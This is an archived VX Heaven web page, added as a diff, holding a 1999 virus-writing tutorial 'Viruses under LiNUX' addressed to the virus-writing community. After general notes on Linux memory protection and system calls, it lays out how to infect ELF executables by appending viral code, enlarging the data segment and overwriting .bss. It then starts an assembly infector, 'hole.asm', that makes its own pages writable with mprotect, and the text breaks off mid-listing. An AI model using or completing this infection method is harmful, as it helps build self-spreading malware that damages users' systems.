@@ -1,0 +1,1162 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> 'Viruses under LiNUX' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content=""/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, ,Viruses under LiNUX, getpid, ring, load, readonly, virus, page, file, alloc, include, dword, descriptor, data, kernel, movl, memory"/>
+<meta name="Description" content="The neverending question, Why aren't viruses for linux?. It seems that the viral community, accustomed to Real Mode systems (DOS), find that is hard to adapt themselves to protected mode systems. Even for Win95/98, systems with important dessign problems, there exists moreless 30 viruses where the great majority are non-resident viruses or VxD infectors (Ring-0 devices)."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"46653a45881bdb69bbca398bb9b1360797aaeacb-1498757525-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vxx04.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Viruses under LiNUX</h1><p> <em><a href="/vx.php?fid=520#f520">Xine [5]</a></em><br/> <em> 1999</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vxx04.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=UN#vxx04">Back to index</a>] [<a href="/lib/vxx04.html#disqus_thread">Comments</a>]<br/> 
+<h2>Index</h2>
+<ol>
+<li>Introduction
+<ol>
+<li>Foreword by Billy Belcebu</li>
+<li>Original Author Introduction</li>
+</ol></li>
+<li>ELF Infection</li>
+<li>Resident viruses
+<ol>
+<li>Global residency in Ring-0</li>
+<li>Global residency in Ring-3</li>
+<li>PerProcess residency</li>
+</ol></li>
+</ol>
+<p>NOTE: This article was made using kernel version 2.0.34, where the segment distribution is different from the actual kernel versions like 2.2.XX.</p>
+<h2>Introduction</h2>
+<h3>Foreword by Billy Belcebu</h3>
+<p>Hi, and welcome to the worlds' first ever Virus Writing Guide alike for the LiNUX system. This tutorial is NOT written by me, and my only intention is to translate it to all the viral community in general. If you want to take a look to the original version (that is in spanish) you can find it on my own website (http://beautifulpeople.cjb.net).</p>
+<p>The author, who wants to remain anonymous, has shown impressive LiNUX skills and aswell a good assembler level (rare for a LiNUX coder), but he has a problem with his lack of optimization ;)</p>
+<p>My conclussions after reading this article are various: LiNUX kicks ass, LiNUX kicks Windoze's ass... You can take a look to its heavy and very intelligent protection: It's almost impossible to achieve Ring-0 (at least not being root), it's impossible to make a Ring-3 global residence (with the impressive mechanism of copy-on-write), and all those details that makes the LiNUX system to be the best choice actually in matter of operative systems. Really. </p>
+<p>My english is not very good, but seems that i'm the only one that wants to take the trouble to translate this. Besides, i think that leave this jewel only in spanish is an unforgivable sin. So, here i am, translating it 4 u ;)</p>
+<p>Enjoy!</p>
+<p>&copy; 1999 Mr Anonymous [ Original Article ]</p>
+<p>&copy; 1999 Billy Belcebu/iKX [ Translation ]</p>
+<p>PS: I have the author permission for this. Don't blame me with copyrightz...</p>
+<h3>Introduction: Memory protection</h3>
+<p>The neverending question, Why aren't viruses for linux?. It seems that the viral community, accustomed to Real Mode systems (DOS), find that is hard to adapt themselves to protected mode systems. Even for Win95/98, systems with important dessign problems, there exists moreless 30 viruses where the great majority are non-resident viruses or VxD infectors (Ring-0 devices).</p>
+<p>It seems that the answer is in the important memory protection implemented by Linux.</p>
+<p>Systems like Win95/NT use a memory dessign with a limited use of segments. In this systems with user and kernel selectors, we can directionate all the virtual space, i.e. from 0x00000000 to 0xFFFFFFFF (That doesn't means that you can write to all the memory, because the memory pages also have some protection attributes).</p>
+<p>However in Linux the dessign is very different, there are two different zones very differenced by segmentation, one dedicated to user processes, that go from 0x00000000 to 0xC0000000 and other for the kernel, that go from 0xC0000000 to 0xFFFFFFFF.</p>
+<p>Let's see a dump of registers with GDB, taken from the beginning of the execution of a command like GZIP.</p>
+<pre>
+        (gdb)info registers
+
+        eax           0x0        0
+        ecx           0x1        1
+        edx           0x0        0          
+        ebx           0x0        0
+        ebp           0xbffffd8c     0xbffffd8c
+        esi           0xbffffd9c     0xbffffd9c
+        edi           0x4000623c     1073766972
+        eip           0x8048b10      0x8048b10
+        eflags        0x296          662
+        cs            0x23           35
+        ss            0x2b           43
+        ds            0x2b           43           
+        es            0x2b           43
+        fs            0x2b           43
+        gs            0x2b           43
+</pre>
+<p>We can see that Linux uses the selector 0x23 for code, and the selector 0x2B for the data. Intel uses 16-bit selectors, the two less significan bits store the RPL (information about the privilege level of that selector, Intel implements 4 protection rings, but the actual operative systems like Win95/NT or Linux use only 2, Ring-0 for the kernel (maximum privilege level) and Ring-3 for the user processes)). The next bit shows where is the descriptor of the segment that contains information about the segment, 0 for the GDT (GLOBAL DESCRIPTOR TABLE) or 1 for the LDT (LOCAL DESCRIPTOR TABLE). The other bits are simply an index of a segment descriptor that will be in the LDT or the GDT according to the information of below.</p>
+<pre>	Selector [ 14 bits, Index to descriptor ] [ 1 bit, GDT/LDT ] [ 2 bits, RPL ]</pre>
+<p>Then, if we pass to binary 0x23 we got</p>
+<pre>	[ 0 0 0 0 0 0 0 0 0 0 0 1 0 0 ] [ 0 ] [ 1 1 ]</pre>
+<p>So we know that it is a Ring-3 selector (it's used by a process) and also we know that tge information of such segment lies in the GDT, at 4th entry. If we analyze the next descriptor (0x2B) we'll obtain a similar information, but the descriptor will be at 5th entry.</p>
+<p>If we take a look to the kernel's code, more concretly in the file called <tt>/usr/src/linux/arch/i386/kernel/head.S</tt> (painfully in assembler :)) we can appreciate the segment initialization in linux.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">/*</span><br/>
+&nbsp;<span style="color: #339933;">*</span> This gdt setup gives the kernel a 1GB address space <span style="color: #0000ff; font-weight: bold;">at</span> virtual<br/>
+&nbsp;<span style="color: #339933;">*</span> address <span style="color: #ff0000;">0xC0000000</span> <span style="color: #339933;">-</span> space enough for expansion<span style="color: #339933;">,</span> I hope<span style="color: #339933;">.</span><br/>
+&nbsp;<span style="color: #339933;">*/</span><br/>
+<br/>
+ENTRY<span style="color: black;">&#40;</span>gdt<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0x0000000000000000</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> NULL descriptor <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0x0000000000000000</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> <span style="color: #00007f; font-weight: bold;">not</span> used <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0xc0c39a000000ffff</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> <span style="color: #ff0000;">0x10</span> kernel 1GB <span style="color: #0000ff; font-weight: bold;">code</span> <span style="color: #0000ff; font-weight: bold;">at</span> <span style="color: #ff0000;">0xC0000000</span> <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0xc0c392000000ffff</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> <span style="color: #ff0000;">0x18</span> kernel 1GB <span style="color: #0000ff; font-weight: bold;">data</span> <span style="color: #0000ff; font-weight: bold;">at</span> <span style="color: #ff0000;">0xC0000000</span> <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0x00cbfa000000ffff</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> <span style="color: #ff0000;">0x23</span> user &nbsp; 3GB <span style="color: #0000ff; font-weight: bold;">code</span> <span style="color: #0000ff; font-weight: bold;">at</span> <span style="color: #ff0000;">0x00000000</span> <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0x00cbf2000000ffff</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> <span style="color: #ff0000;">0x2b</span> user &nbsp; 3GB <span style="color: #0000ff; font-weight: bold;">data</span> <span style="color: #0000ff; font-weight: bold;">at</span> <span style="color: #ff0000;">0x00000000</span> <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0x0000000000000000</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> <span style="color: #00007f; font-weight: bold;">not</span> used <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0x0000000000000000</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> <span style="color: #00007f; font-weight: bold;">not</span> used <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>fill <span style="color: #ff0000;">2</span><span style="color: #339933;">*</span>NR_TASKS<span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> space for LDT<span style="color: #7f007f;">'s and TSS'</span>s etc <span style="color: #339933;">*/</span><br/>
+#ifdef CONFIG_APM<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0x00c09a0000000000</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> APM <span style="color: #46aa03; font-weight: bold;">CS</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">code</span> <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0x00809a0000000000</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> APM <span style="color: #46aa03; font-weight: bold;">CS</span> <span style="color: #ff0000;">16</span> <span style="color: #0000ff; font-weight: bold;">code</span> <span style="color: black;">&#40;</span><span style="color: #ff0000;">16</span> bit<span style="color: black;">&#41;</span> <span style="color: #339933;">*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>quad <span style="color: #ff0000;">0x00c0920000000000</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/*</span> APM <span style="color: #46aa03; font-weight: bold;">DS</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">data</span> <span style="color: #339933;">*/</span><br/>
+#endif<br/>
+&nbsp;</div>
+<p>As you can see, Linux initializes 4 segments: 2 for kernel and 2 for user, depending if they are of code or data. In each entry is stored information like the base address of the segment and its limit, if it's resident in memory or not, the kind of segment, if its code is in 16 or 32 bits. Meanwhile there are an user selector in the DS segment, we can't ever handle an address over 0xC0000000 because we would be out of the memory that can be accessed by the segment, we would receive a SIGSEGV signal and our process would be finished painfully.</p>
+<p>I know i can directionate from 0x00000000 to 0xC0000000 but, what can i modify?. Here begins the real protection mechanism. The memory is divided in pages of 4Kb each one in the case of Intel, and each page has its own attributes: if they are read/write, if it's in memory (it can be at disk temporally), if it's of kernel, etc.</p>
+<p>All the information about pages in memory is located in a page table that contains descriptors for each mapped page in memory. There is one page table for each process in memory, this makes that each process has its own virtual space and besides, that any other process could access to another one.</p>
+<p>This makes possible to load programs in the same memory address, and really it's what it does. Windows 95/98 and Linux do it. In Linux the usual load address is 0x08040000 while in Windows it is 0x00400000.</p>
+<p>This page table is pointed by a control register of the processor (the CR3) so it changes with each change of context modifying also the virtual space of the process.</p>
+<p>But then, if a process can only handle directionate the perprocess memory, how is it able to execute system calls that reside over 0xC0000000? Intel brings us mechanisms for jump to Ring-0 in a safe way when we need to make system calls. Intel uses two methods: the TRAP GATES and the CALL GATES. Usually are used the TRAP GATES (WinNT/98/95, Linux); even i believe that some other unix systems use the CALL GATES for make the Ring jump.</p>
+<p>The Trap Gates occupy one entry in the IDT (INTERRUPT DESCRIPTOR TABLE), and allow the jump to Ring-0 with the generation of one interrupt. For that, the jump address defined in the IDT must have a Ring-0 selector and the DPL (Descriptor Privilege Level) must be 3, allowing an user to execute it. In Linux the interrupt used for the jump is the 0x80, while Win95 uses the int 0x30, for example.</p>
+<p>Let's see the disassembly of the getpid function of the LIBC library. For that we create a C file like this:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<span style="color: #339933;">#include &lt;unistd.h&gt;</span><br/>
+<br/>
+&nbsp;<span style="color: #993333;">void</span> main<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; getpid<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* I get the PID of the process */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>After compile it, we debug the binary file with GDB:</p>
+<pre>
+        (gdb)disass
+
+        0x8048480 &lt;main>:        pushl %ebp
+        0x8048481 &lt;main+1>:      movl  %esp,%ebp
+        0x8048483 &lt;main+3>:      call  0x8048378 &lt;getpid>
+        0x8048488 &lt;main+8>:      movl  %ebp,%esp
+        0x804848a &lt;main+13>:     popl  %ebp
+        0x804848b &lt;main+11>:     ret
+</pre>
+<p>As you can see the call to getpid is dessigned in Linux (and in other systems) as a CALL to a special section inside the binary file (0x8048378). There we could find a jump to the desired library function. This jumps are built in memory by the OS for choose the dynamic links with the libraries. With this, any file could execute exported functions of others, if it's pointed in this way by the information in the ELF header. Let's continue debugging:</p>
+<pre>
+        (gdb)disass getpid
+
+        0x40073000 &lt;__getpid>:   pushl %ebp 
+        0x40073001 &lt;__getpid+1>: movl  %esp,%ebp
+        0x40073003 &lt;__getpid+3>: pushl %ebx
+        0x40073004 &lt;__getpid+4>: movl  $0x14,%eax
+        0x40073009 &lt;__getpid+9>: int   $0x80
+</pre>
+<p>These are the first instructions of the getpid library call. Its work is simple: we are only preparing a jump to Ring-0. If the function would have some parameters, it would have prepared the registers for that parameters before doing the jump to Ring-0. It would have put in EAX the number of function, and it would have called to the int 0x80. As you can see, the code of the libraries is in the PerProcess memory, below 0xC0000000, so it's Ring-3 code and it lacks of privileges for access ports,to privileged memory areas, etc. That's the reason because the libraries are really intermediary between the calls made by the processes and the calls generated via int 0x80</p>
+<p>All the system calls that need to jump to Ring-0 will use the int 0x80, and the int 0x80 has only a descriptor, we'll jump always to the same memory address. That makes us to need to put in EAX register the number of the function we want to call to. In Ring-0, the kernel evaluates the value of EAX for know what function if has to satisfy, and according to its value, it would jump to one function or to another using an internal table of pointers to function called sys_call_table. The list of function accedped with the int 0x80 is in the file <tt>/usr/include/sys/syscall.h</tt></p>
+<p>With the execution of an <code>int 0x80</code> the processor will change the selector of code active. It'll change from the selector 0x23 to 0x10, so we'll pass from directionate from 0x00000000-0xC0000000 to 0xC0000000-0xFFFFFFFF.</p>
+<p>The next method of jump, rarely used, is based in an entry in the GDT or excepcionally in the LDT. There we'll define what's denominated a CALL GATE, that allows jumps to Rings of more privilege via the instruction <code>CALL FAR</code> or <code>JUMP FAR</code> of assembler.</p>
+<h2>ELF infection</h2>
+<p>In Linux there are two formats of executables: a.out and ELF; however every executable and library of Linux nowadays use the second format. The ELF format is very powerful, and contains information for handle applications under different processors. It contains information about the processor where the executable was compiled, or if it has to use little endian or big endian. As it is a format of processors in extended mode, besides the information about the physical sections that are in the file, there is some information about how the OS has to map the file in memory.</p>
+<p>The ELF file has one first part that occupies the first 0x24 bytes of the executable, and contains, among other things, a mark 'ELF' for show us that it is an executable file with ELF format; the kind of processor, the base address (that is the virtual address of the first instruction that will be executed in the file) and after, 2 pointers to 2 tables.</p>
+<p>The first table pointed is the Program Header (located physically after the ELF header) that contains entries with information about how will be mapped in memoy the file. Each entry will contain the size of each segment in the memory and in the file, also the address of the init of the segment.</p>
+<p>The next table is the Section Header, and it's just at the end of the file. It'll contain information about each logical section, it'll also contain protection attributes, but this information won't be used for map the code of the file in memory.</p>
+<p>With the GDB command 'maintenance info sections' we can see the section structure with all the protection attributes of each section. If you take a look at it, you'll realize that all the readonly sections are situated the first ones, and the read/write sections, altogether at the end. This is necessary because the code sections are mapped altogether in memory in consecutive pages by means of an entry in the program header. That's why all the section that share the same protection attributes will be able to share memory pages, meanwhile the sections with different attributes won't be able to do so. With this we avoid the internal fragmentation in the executables, because if every section would have to map separately, the last page of every section would be empty, and many space would be wasted.</p>
+<p>Also look to the last readonly page doesn't share a page with the first one with readwrite attributes. The dump of this instruction with a command like gzip would be the following:</p>
+<pre>
+ (gdb)maintenance info sections
+ Exec file:
+ '/bin/gzip', file type elf32-i386.
+ 0x080480d4->0x080480e7 at 0x000000d4: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x080480e8->0x08048308 at 0x000000e8: .has ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08048308->0x08048738 at 0x00000308: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08048738->0x08048956 at 0x00000738: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08048998->0x08048b08 at 0x00000958: .rel.bss ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08048b10->0x08048b18 at 0x00000b10: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
+ 0x08048b18->0x08048e08 at 0x00000b18: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
+ 0x08048e10->0x08050dac at 0x00000e10: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
+ 0x08050db0->0x08050db8 at 0x00008db0: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
+ 0x08050db8->0x08051f25 at 0x00008db8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08052f28->0x08053960 at 0x00009f28: .data ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053960->0x08053968 at 0x0000a960: .ctors ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053968->0x08053968 at 0x0000a968: .dtors ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053970->0x08053a34 at 0x0000a970: .got ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053a34->0x08053abc at 0x0000aa34: .dynamic ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053abc->0x080a4078 at 0x0000aabc: .bss ALLOC
+ 0x00000000->0x00000178 at 0x0000aabc: .comment READONLY HAS_CONTENTS
+ 0x00000178->0x000002b8 at 0x0000ac34: .note READONLY HAS_CONTENTS
+</pre>
+<p>Take a look to that curious jump between .rodata and .data sections caused by all that i exposed before. This command allows you to visialize how will be in memory the program, but its information in not important for its load. We won't even need to modify the section header for insert more executable code in the file. The Program Header is the true informer of the load process. It contains 5 entries, but it's possible to insert more.</p>
+<ul>
+<li>The first one loads the program header.</li>
+<li>The second one is a reference to an string with the routine and the name of the interpreter that will be the library that will create in memory the image of the process (usually <tt>ld-linux-so.1</tt>).</li>
+<li>The third one loads every readonly sections, all those found in the first entries of the Section Header.</li>
+<li>The fourth loads all the read/write sections</li>
+<li>The fifth loads the .dynamic section needed for the dynamic link process.</li>
+</ul>
+<p>So one solution for insert more executable code could be the expanding of the data segment. This is problematic, because if we copy all the viric code to the end of the executable, i.e. just after the section header, and we expand the entry of the Program Header that corresponds with the data segment, the viral code would overwrite one logical section of the archive, the .bss section. As we had seen with the gdb dump, the .bss section is the last one that is part of the space of the process, and contains the ALLOC attribute, however it doesn't contains the LOAD attribute, so it doesn't load data from the file. This is caused by the fact that the .bss section contains uninitialized data (still) by the host code. If the viric code is mapped over that section is not very problematic, because the virus will be executed before the infected host, so after the virus execution, the host wouldn't care about it. This section, at load time, if filled of zeroes, so a bad programming, like suppose an uninitialized variable set to 0, would show the presence of the virus. In any case,the virus can avoid this copying itself to any other memory address, and filling its old position in .bss with zeroes.</p>
+<p>Another possibility could be to create another entry in the program header, but we would have to shift almost all the archive, and this would take too much infection time.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;****************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Linux ELF file infection</span><br/>
+<span style="color: black; font-style: italic;">;****************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; Compile with:</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;nasm -f elf hole.asm -o hole.o</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;gcc hole.o -o hole</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">section</span> <span style="color: #0000ff; font-weight: bold;">.text</span><span style="color: black;">&#93;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">global</span> main<span style="color: black;">&#93;</span><br/>
+<br/>
+hoste<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+main<span style="color: #339933;">:</span> &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pusha</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Beginning of the virus</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Push all the parameters</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;getdelta<br/>
+getdelta<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span>getdelta &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">125</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; I modify the attributes with</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>main<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; mprotect for write in protec-</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ted pages</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0xFFFFF000</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Round up to pages</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">03000h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; r|w|x attributes</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">07h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; We will only need this in </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">80h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; the 1st gen, because we'll</span><br/>
